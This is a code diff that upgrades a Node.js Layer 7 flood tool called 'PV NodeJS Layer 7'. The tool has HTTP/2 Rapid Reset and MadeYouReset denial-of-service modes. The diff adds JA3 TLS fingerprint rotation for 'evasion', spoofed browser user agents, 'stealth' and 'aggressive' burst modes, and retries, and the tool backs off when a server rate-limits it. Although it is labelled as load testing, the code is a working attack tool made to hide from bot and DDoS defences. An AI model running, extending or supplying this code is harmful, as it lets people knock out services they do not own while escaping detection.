@@ -16,32 +16,35 @@ const chalk = require('chalk');
 
 const USER_AGENTS = [
     // Desktop
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.1823.82",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 
     // Mobile
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/115.0.5790.130 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36"
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.5790.130 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; moto g8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
 ];
 
-const TLS_PROFILES = [
-    { // Chrome 117 on Windows 10
+// JA3 Fingerprint Profiles - Real browser signatures
+const JA3_PROFILES = [
+    {
+        name: 'Chrome 120 (Windows 10)',
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
         ciphers: [
             'TLS_AES_128_GCM_SHA256',
             'TLS_AES_256_GCM_SHA384',
@@ -58,11 +61,17 @@ const TLS_PROFILES = [
             'TLS_RSA_WITH_AES_256_GCM_SHA384',
             'TLS_RSA_WITH_AES_128_CBC_SHA',
             'TLS_RSA_WITH_AES_256_CBC_SHA'
-        ].join(':'),
+        ],
+        ecdhCurve: 'X25519:P-256:P-384:P-521',
         sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
-        ecdhCurve: 'X25519:P-256:P-384'
+        alpnProtocols: ['h2', 'http/1.1'],
+        sessionTicket: true,
+        ocspStapling: true
     },
-    { // Firefox 117 on macOS
+    {
+        name: 'Firefox 121 (Linux)',
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
         ciphers: [
             'TLS_AES_128_GCM_SHA256',
             'TLS_CHACHA20_POLY1305_SHA256',
@@ -78,19 +87,86 @@ const TLS_PROFILES = [
             'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
             'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
             'TLS_RSA_WITH_AES_128_GCM_SHA256',
-            'TLS_RSA_WITH_AES_256_GCM_SHA384',
-            'TLS_RSA_WITH_AES_128_CBC_SHA',
-            'TLS_RSA_WITH_AES_256_CBC_SHA'
-        ].join(':'),
+            'TLS_RSA_WITH_AES_256_GCM_SHA384'
+        ],
+        ecdhCurve: 'X25519:P-256:P-384:P-521',
         sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
-        ecdhCurve: 'X25519:P-256:P-384:P-521'
+        alpnProtocols: ['h2', 'http/1.1'],
+        sessionTicket: false,
+        ocspStapling: false
+    },
+    {
+        name: 'Safari 17 (macOS)',
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
+        ciphers: [
+            'TLS_AES_128_GCM_SHA256',
+            'TLS_AES_256_GCM_SHA384',
+            'TLS_CHACHA20_POLY1305_SHA256',
+            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
+            'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
+            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
+            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
+            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
+            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
+        ],
+        ecdhCurve: 'X25519:P-256:P-384:P-521',
+        sigalgs: 'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512',
+        alpnProtocols: ['h2', 'http/1.1'],
+        sessionTicket: true,
+        ocspStapling: true
+    },
+    {
+        name: 'Chrome 120 (Android)',
+        minVersion: 'TLSv1.2',
+        maxVersion: 'TLSv1.3',
+        ciphers: [
+            'TLS_AES_128_GCM_SHA256',
+            'TLS_AES_256_GCM_SHA384',
+            'TLS_CHACHA20_POLY1305_SHA256',
+            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
+            'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
+            'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
+            'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
+        ],
+        ecdhCurve: 'X25519:P-256:P-384',
+        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
+        alpnProtocols: ['h2', 'http/1.1'],
+        sessionTicket: true,
+        ocspStapling: false
     }
 ];
 
-const BURST_CONFIG = {
-    requestsPerBurst: 15,
-    thinkTimeMs: 1200,
-    jitterMs: 800,
+// Burst Mode Profiles
+const BURST_MODES = {
+    aggressive: {
+        name: 'Aggressive',
+        requestsPerBurst: 50,
+        thinkTimeMs: 300,
+        jitterMs: 100,
+        description: 'Maximum throughput - minimal delays'
+    },
+    normal: {
+        name: 'Normal',
+        requestsPerBurst: 15,
+        thinkTimeMs: 1200,
+        jitterMs: 800,
+        description: 'Balanced approach - realistic human-like behavior'
+    },
+    stealth: {
+        name: 'Stealth',
+        requestsPerBurst: 3,
+        thinkTimeMs: 3000,
+        jitterMs: 2000,
+        description: 'Low profile - mimics careful human browsing'
+    },
+    random: {
+        name: 'Random',
+        requestsPerBurst: null,
+        thinkTimeMs: null,
+        jitterMs: null,
+        description: 'Fully randomized burst patterns'
+    }
 };
 
 const REFERERS = [
@@ -125,15 +201,29 @@ const HTTP_STATUS_CODES = {
     0: "Connection Error"
 };
 
-// Configuration constants - centralized for maintainability
+// Advanced Configuration
 const CONFIG = {
-    MAX_BUFFER_SIZE: 1024 * 1024, // 1MB cap for payloads
+    // Core settings
+    MAX_BUFFER_SIZE: 1024 * 1024,
     MAX_DELAY_MS: 10000,
     STREAMS_PER_CONNECTION: 20,
     ATTACK_RECONNECT_MS: 100,
     MONITOR_INTERVAL_MS: 250,
     PROTOCOL_DETECTION_TIMEOUT: 5000,
     LOG_QUEUE_SIZE: 5,
+    
+    // Retry configuration
+    MAX_RETRIES: 3,
+    RETRY_DELAY_MS: 500,
+    RETRY_BACKOFF_MULTIPLIER: 2.0,
+    RETRYABLE_ERRORS: [
+        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'EHOSTUNREACH',
+        'ENETUNREACH', 'ERR_HTTP2_STREAM_ERROR', 'ENOTFOUND', 'ECONNABORTED'
+    ],
+    RETRYABLE_STATUS_CODES: [408, 429, 502, 503, 504],
+    
+    // JA3 rotation
+    JA3_ROTATION_INTERVAL: 25, // rotate JA3 every N requests
 };
 
 // ##################################################################
@@ -141,7 +231,6 @@ const CONFIG = {
 // ##################################################################
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
-const getRandomTlsProfile = () => getRandomElement(TLS_PROFILES);
 const stripAnsi = (str) => str.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');
 
 const formatTime = (seconds) => {
@@ -151,7 +240,56 @@ const formatTime = (seconds) => {
     return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
 };
 
-// Validate URL format and return parsed object
+// Get JA3 profile with rotation
+function getJa3Profile(requestCount) {
+    const rotationIndex = Math.floor(requestCount / CONFIG.JA3_ROTATION_INTERVAL) % JA3_PROFILES.length;
+    return JA3_PROFILES[rotationIndex];
+}
+
+// Randomize cipher order
+function randomizeCipherOrder(ciphers) {
+    const arr = [...ciphers];
+    for (let i = arr.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [arr[i], arr[j]] = [arr[j], arr[i]];
+    }
+    return arr.join(':');
+}
+
+// Create TLS options from JA3 profile
+function createTlsOptions(ja3Profile) {
+    return {
+        rejectUnauthorized: false,
+        minVersion: ja3Profile.minVersion,
+        maxVersion: ja3Profile.maxVersion,
+        ciphers: randomizeCipherOrder(ja3Profile.ciphers),
+        ecdhCurve: ja3Profile.ecdhCurve,
+        sigalgs: ja3Profile.sigalgs,
+        ALPNProtocols: ja3Profile.alpnProtocols || ['h2', 'http/1.1']
+    };
+}
+
+// Retry with exponential backoff
+async function retryWithBackoff(fn, workerId, attempt = 0) {
+    try {
+        return await fn();
+    } catch (err) {
+        const isRetryableError = CONFIG.RETRYABLE_ERRORS.includes(err.code);
+        const isRetryableStatus = CONFIG.RETRYABLE_STATUS_CODES.includes(err.statusCode);
+        
+        if (attempt < CONFIG.MAX_RETRIES && (isRetryableError || isRetryableStatus)) {
+            const delayMs = CONFIG.RETRY_DELAY_MS * Math.pow(CONFIG.RETRY_BACKOFF_MULTIPLIER, attempt);
+            stats.retries = (stats.retries || 0) + 1;
+            stats.retryErrors[err.code || err.statusCode] = (stats.retryErrors[err.code || err.statusCode] || 0) + 1;
+            
+            await new Promise(resolve => setTimeout(resolve, delayMs));
+            return retryWithBackoff(fn, workerId, attempt + 1);
+        }
+        throw err;
+    }
+}
+
+// Validate URL
 const validateAndParseUrl = (urlString) => {
     try {
         const parsedUrl = new URL(urlString);
@@ -167,7 +305,7 @@ const validateAndParseUrl = (urlString) => {
     }
 };
 
-// Validate command line arguments
+// Validate arguments
 const validateArguments = (argv) => {
     if (argv.time <= 0 || argv.time > 1440) {
         throw new Error('Time must be between 0 and 1440 minutes');
@@ -177,6 +315,9 @@ const validateArguments = (argv) => {
     }
     if (!['none', 'rapid-reset', 'madeyoureset'].includes(argv.attack)) {
         throw new Error('Invalid attack mode');
+    }
+    if (!Object.keys(BURST_MODES).includes(argv.burstMode)) {
+        throw new Error('Invalid burst mode');
     }
 };
 
@@ -188,15 +329,31 @@ const argv = yargs(hideBin(process.argv))
     .option('url', { alias: 'u', describe: 'Target URL', type: 'string', demandOption: true })
     .option('time', { alias: 't', describe: 'Test duration in minutes', type: 'number', default: 1 })
     .option('conc', { alias: 'c', describe: 'Concurrency / threads', type: 'number', default: 50 })
+    .option('burst-mode', {
+        alias: 'bm',
+        describe: 'Burst mode: aggressive, normal, stealth, random',
+        default: 'normal',
+        choices: ['aggressive', 'normal', 'stealth', 'random']
+    })
+    .option('enable-ja3', {
+        describe: 'Enable JA3 fingerprint evasion',
+        type: 'boolean',
+        default: true
+    })
+    .option('enable-retry', {
+        describe: 'Enable automatic retry on errors',
+        type: 'boolean',
+        default: true
+    })
     .option('attack', {
         alias: 'a',
-        describe: 'Specify the HTTP/2 attack mode',
+        describe: 'HTTP/2 attack mode',
         choices: ['none', 'rapid-reset', 'madeyoureset'],
         default: 'none'
     })
     .option('protocol', {
         alias: 'p',
-        describe: 'Force protocols (e.g., "1.1,2,3"). Bypasses auto-detection.',
+        describe: 'Force protocols (e.g., "1.1,2,3")',
         type: 'string',
     })
     .option('adaptive-delay', {
@@ -227,16 +384,21 @@ const targetUrl = `${target.protocol}//${target.host}:${target.port}`;
 const durationMs = argv.time * 60 * 1000;
 const concurrency = argv.conc;
 const attackMode = argv.attack;
+const burstMode = BURST_MODES[argv.burstMode];
 
-// --- Global Stats ---
+// Global Stats
 let isRunning = true;
 let activeProtocols = [];
 let activeConnections = new Set();
+let requestCounter = 0;
+
 const stats = {
     requestsSent: 0,
     responsesReceived: 0,
     totalLatency: 0,
     errors: 0,
+    retries: 0,
+    retryErrors: {},
     attackSent: 0,
     attackReceived: 0,
     attackErrors: 0,
@@ -244,15 +406,21 @@ const stats = {
     protocolStats: {},
     startTime: Date.now(),
 };
+
 const lastLogs = [];
 const lastAttackLogs = [];
 const workerDelays = new Array(concurrency).fill(0);
-let selectedTlsProfile = null; // Cache TLS profile per connection phase
-
 
 async function runStandardWorker(workerId, client, protocolKey) {
     let requestsInBurst = 0;
     const protocolLabel = protocolKey.toUpperCase();
+    
+    // Determine burst config
+    let burstConfig = burstMode;
+    if (argv.burstMode === 'random') {
+        const modes = Object.values(BURST_MODES).filter(m => m.name !== 'Random');
+        burstConfig = modes[Math.floor(Math.random() * modes.length)];
+    }
     
     activeConnections.add(client);
 
@@ -260,7 +428,9 @@ async function runStandardWorker(workerId, client, protocolKey) {
         if (!isRunning) return;
 
         if (argv.adaptiveDelay && workerDelays[workerId] > 0) {
-            await new Promise(resolve => setTimeout(resolve, Math.min(workerDelays[workerId], CONFIG.MAX_DELAY_MS)));
+            await new Promise(resolve => 
+                setTimeout(resolve, Math.min(workerDelays[workerId], CONFIG.MAX_DELAY_MS))
+            );
         }
 
         const headers = { 
@@ -268,18 +438,28 @@ async function runStandardWorker(workerId, client, protocolKey) {
             'Accept': getRandomElement(ACCEPT_HEADERS), 
             'Referer': getRandomElement(REFERERS) 
         };
+        
         stats.requestsSent++;
+        requestCounter++;
         const startTime = process.hrtime.bigint();
 
         try {
-            const { statusCode, body } = await client.request({
-                path: target.path,
-                method: 'GET',
-                headers,
-            });
+            // Use retry wrapper if enabled
+            const makeRequest = async () => {
+                const { statusCode, body } = await client.request({
+                    path: target.path,
+                    method: 'GET',
+                    headers,
+                });
 
-            // Consume response body to avoid memory leaks
-            for await (const chunk of body) {}
+                // Consume response body
+                for await (const chunk of body) {}
+                return { statusCode };
+            };
+
+            const result = argv.enableRetry 
+                ? await retryWithBackoff(makeRequest, workerId)
+                : await makeRequest();
 
             const endTime = process.hrtime.bigint();
             const latencyMs = Number(endTime - startTime) / 1e6;
@@ -288,13 +468,12 @@ async function runStandardWorker(workerId, client, protocolKey) {
             
             const pStats = stats.protocolStats[protocolKey];
             pStats.responses++;
-            pStats.statuses[statusCode] = (pStats.statuses[statusCode] || 0) + 1;
+            pStats.statuses[result.statusCode] = (pStats.statuses[result.statusCode] || 0) + 1;
 
-            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.green(statusCode)} (${chalk.yellow(latencyMs.toFixed(2) + 'ms')})`);
+            lastLogs.push(`[${protocolLabel}] ${argv.url} -> ${chalk.green(result.statusCode)} (${chalk.yellow(latencyMs.toFixed(2) + 'ms')})`);
             
-            // Adaptive delay logic with bounds checking
             if (argv.adaptiveDelay) {
-                switch (statusCode) {
+                switch (result.statusCode) {
                     case 401: case 403: case 429: case 431: case 451:
                         workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, workerDelays[workerId] + 150);
                         break;
@@ -302,7 +481,7 @@ async function runStandardWorker(workerId, client, protocolKey) {
                         workerDelays[workerId] = Math.min(CONFIG.MAX_DELAY_MS, workerDelays[workerId] + 75);
                         break;
                     default:
-                        if (statusCode < 400) {
+                        if (result.statusCode < 400) {
                             workerDelays[workerId] = Math.max(0, workerDelays[workerId] - 50);
                         }
                 }
@@ -321,9 +500,11 @@ async function runStandardWorker(workerId, client, protocolKey) {
     const scheduleNext = () => {
         if (!isRunning) return;
         requestsInBurst++;
-        if (requestsInBurst >= BURST_CONFIG.requestsPerBurst) {
+        
+        // Apply burst mode logic
+        if (requestsInBurst >= burstConfig.requestsPerBurst) {
             requestsInBurst = 0;
-            const thinkTime = BURST_CONFIG.thinkTimeMs + (Math.random() * BURST_CONFIG.jitterMs);
+            const thinkTime = burstConfig.thinkTimeMs + (Math.random() * burstConfig.jitterMs);
             setTimeout(sendRequest, thinkTime);
         } else {
             setImmediate(sendRequest);
@@ -333,17 +514,14 @@ async function runStandardWorker(workerId, client, protocolKey) {
     sendRequest();
 }
 
-
-// --- HTTP/2 Attack Worker ---
+// HTTP/2 Attack Worker
 function startHttp2AttackWorker() {
     if (!isRunning) return;
     
-    const tlsProfile = selectedTlsProfile || getRandomTlsProfile();
-    const client = http2.connect(targetUrl, {
-        rejectUnauthorized: false,
-        ...tlsProfile
-    });
+    const ja3Profile = argv.enableJa3 ? getJa3Profile(requestCounter) : JA3_PROFILES[0];
+    const tlsOptions = createTlsOptions(ja3Profile);
     
+    const client = http2.connect(targetUrl, tlsOptions);
     activeConnections.add(client);
 
     const reconnect = () => {
@@ -351,7 +529,7 @@ function startHttp2AttackWorker() {
             try {
                 client.destroy();
             } catch (e) {
-                // Ignore errors during cleanup
+                // Ignore
             }
         }
         if (isRunning) setTimeout(startHttp2AttackWorker, CONFIG.ATTACK_RECONNECT_MS);
@@ -369,7 +547,7 @@ function startHttp2AttackWorker() {
     });
 }
 
-// --- Rapid Reset (Client-side RST_STREAM) ---
+// Rapid Reset
 function sendRapidReset(client) {
     if (!isRunning || client.destroyed || client.closing) return;
     const headers = { ':method': 'GET', ':path': target.path, ':scheme': 'https', ':authority': target.host };
@@ -381,7 +559,7 @@ function sendRapidReset(client) {
             stats.attackReceived++;
             const statusCode = h[':status'];
             stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
-            lastAttackLogs.push(`[Rapid Reset] -> ${chalk.yellow(statusCode)} (Response Before Reset)`);
+            lastAttackLogs.push(`[Rapid Reset] -> ${chalk.yellow(statusCode)}`);
             if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
         });
         stream.on('error', () => {
@@ -396,7 +574,7 @@ function sendRapidReset(client) {
     }
 }
 
-// --- MadeYouReset (Server-side RST_STREAM) ---
+// MadeYouReset
 function sendMadeYouReset(client) {
     if (!isRunning || client.destroyed || client.closing) return;
     const headers = { ':method': 'POST', ':path': target.path, ':scheme': 'https', ':authority': target.host };
@@ -408,13 +586,13 @@ function sendMadeYouReset(client) {
             stats.attackReceived++;
             const statusCode = h[':status'];
             stats.statusCounts[statusCode] = (stats.statusCounts[statusCode] || 0) + 1;
-            lastAttackLogs.push(`[MadeYouReset] -> ${chalk.yellow(statusCode)} (Response)`);
+            lastAttackLogs.push(`[MadeYouReset] -> ${chalk.yellow(statusCode)}`);
             if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
         });
         stream.on('error', (err) => {
             if (err.code === 'ERR_HTTP2_STREAM_ERROR') {
                 stats.statusCounts['RESET'] = (stats.statusCounts['RESET'] || 0) + 1;
-                lastAttackLogs.push(`[MadeYouReset] -> ${chalk.green('SUCCESS')} (Server Reset Stream)`);
+                lastAttackLogs.push(`[MadeYouReset] -> ${chalk.green('SUCCESS')}`);
                 if (lastAttackLogs.length > CONFIG.LOG_QUEUE_SIZE) lastAttackLogs.shift();
             } else {
                 stats.attackErrors++;
@@ -425,7 +603,6 @@ function sendMadeYouReset(client) {
             if (stream.destroyed) return;
             try {
                 const remoteWindowSize = stream.state.remoteWindowSize;
-                // FIX: Cap buffer size to prevent memory exhaustion vulnerability
                 const payloadSize = Math.min(remoteWindowSize + 1, CONFIG.MAX_BUFFER_SIZE);
                 if (payloadSize > 0) {
                     const oversizedPayload = Buffer.alloc(payloadSize);
@@ -439,7 +616,7 @@ function sendMadeYouReset(client) {
                     try {
                         stream.destroy();
                     } catch (e) {
-                        // Ignore cleanup errors
+                        // Ignore
                     }
                 }
             }
@@ -449,16 +626,15 @@ function sendMadeYouReset(client) {
     }
 }
 
-
-// --- Monitor ---
+// Enhanced Monitor Display
 function updateMonitor() {
     console.clear();
     const elapsedSeconds = (Date.now() - stats.startTime) / 1000;
     const timeRemaining = Math.max(0, (durationMs / 1000) - elapsedSeconds);
 
-    console.log(chalk.cyan('--------------------------------------------'));
-    console.log(chalk.cyan.bold('          ⚡️ PV NodeJS Layer 7 ⚡️         '));
-    console.log(chalk.cyan('--------------------------------------------'));
+    console.log(chalk.cyan('════════════════════════════════════════════════════════════════'));
+    console.log(chalk.cyan.bold('          ⚡️ PV NodeJS Layer 7 - Enhanced Edition ⚡️         '));
+    console.log(chalk.cyan('════════════════════════════════════════════════════════════════'));
     
     if (attackMode !== 'none') {
         console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
@@ -472,42 +648,47 @@ function updateMonitor() {
         console.log(chalk.white.bold('Attack Errors/Resets: ') + chalk.red(totalResetsAndErrors));
 
     } else {
-        const leftColumn = [];
-        const rightColumn = [];
-
-        leftColumn.push(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
-        leftColumn.push(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
-        const mode = argv.protocol ? 'Forced' : 'Detected';
-        leftColumn.push(chalk.white.bold(`Protocols (${mode}): `) + chalk.cyan(activeProtocols.map(p => p.toUpperCase()).join(', ') || '...'));
-
+        console.log(chalk.white.bold('Target: ') + chalk.green(`${target.protocol}//${target.host}:${target.port}${target.path}`));
+        console.log(chalk.white.bold('Time Remaining: ') + chalk.yellow(formatTime(timeRemaining)));
+        console.log(chalk.white.bold('Burst Mode: ') + chalk.cyan(burstMode.name + ' - ' + burstMode.description));
+        console.log('');
+        
         const rps = (stats.requestsSent / elapsedSeconds || 0).toFixed(2);
         const avgLatency = (stats.totalLatency / stats.responsesReceived || 0).toFixed(2);
-        rightColumn.push(chalk.white.bold('Total Requests Sent: ') + chalk.blue(stats.requestsSent));
-        rightColumn.push(chalk.white.bold('Total Responses Rcvd: ') + chalk.blue(stats.responsesReceived));
-        rightColumn.push(chalk.white.bold('Requests/Second: ') + chalk.magenta(rps));
-        rightColumn.push(chalk.white.bold('Avg Latency: ') + chalk.yellow(`${avgLatency} ms`));
         
-        const maxLeftLength = Math.max(...leftColumn.map(line => stripAnsi(line).length));
-        const padding = 5;
-
-        const maxRows = Math.max(leftColumn.length, rightColumn.length);
-        for (let i = 0; i < maxRows; i++) {
-            const left = leftColumn[i] || '';
-            const right = rightColumn[i] || '';
-            const leftPadded = left + ' '.repeat(Math.max(0, maxLeftLength - stripAnsi(left).length));
-            console.log(`${leftPadded}${' '.repeat(padding)}${right}`);
+        console.log(chalk.white.bold('═══ Load Testing Metrics ═══'));
+        console.log(chalk.white.bold('Requests Sent: ') + chalk.blue(stats.requestsSent));
+        console.log(chalk.white.bold('Responses Received: ') + chalk.blue(stats.responsesReceived));
+        console.log(chalk.white.bold('Requests/Second: ') + chalk.magenta(rps));
+        console.log(chalk.white.bold('Avg Latency: ') + chalk.yellow(`${avgLatency} ms`));
+        
+        if (argv.enableRetry) {
+            console.log(chalk.white.bold('Retries: ') + chalk.cyan(stats.retries));
+            if (Object.keys(stats.retryErrors).length > 0) {
+                const retryErrorSummary = Object.entries(stats.retryErrors)
+                    .map(([k, v]) => `${k}:${v}`)
+                    .join(', ');
+                console.log(chalk.white.bold('Retry Errors: ') + chalk.yellow(retryErrorSummary));
+            }
         }
+        
+        if (argv.enableJa3) {
+            const currentJa3 = getJa3Profile(requestCounter);
+            console.log(chalk.white.bold('Current JA3 Profile: ') + chalk.magenta(currentJa3.name));
+        }
+        
+        console.log(chalk.white.bold('Errors: ') + chalk.red(stats.errors));
     }
 
     console.log('');
     console.log(chalk.white.bold('Response Status Counts:'));
     
     if (attackMode !== 'none') {
-        const sortedAttackStatuses = Object.keys(stats.statusCounts).sort();
-        if (sortedAttackStatuses.length === 0) {
-            console.log(chalk.gray('  (waiting for responses...)'));
+        const sortedStatuses = Object.keys(stats.statusCounts).sort();
+        if (sortedStatuses.length === 0) {
+            console.log(chalk.gray('  (waiting...)'));
         } else {
-            sortedAttackStatuses.forEach(code => {
+            sortedStatuses.forEach(code => {
                 const color = code === 'RESET' ? chalk.green : chalk.red;
                 const message = HTTP_STATUS_CODES[code] || 'Unknown';
                 console.log(`  ${color(code)} (${message}): ${chalk.blue(stats.statusCounts[code])}`);
@@ -525,12 +706,12 @@ function updateMonitor() {
             const sortedStatuses = Array.from(allStatusCodes).sort((a, b) => b - a);
             
             if (sortedStatuses.length === 0) {
-                console.log(chalk.gray('  (waiting for responses...)'));
+                console.log(chalk.gray('  (waiting...)'));
             } else {
                 const COLUMN_WIDTH = 30;
                 let header = '';
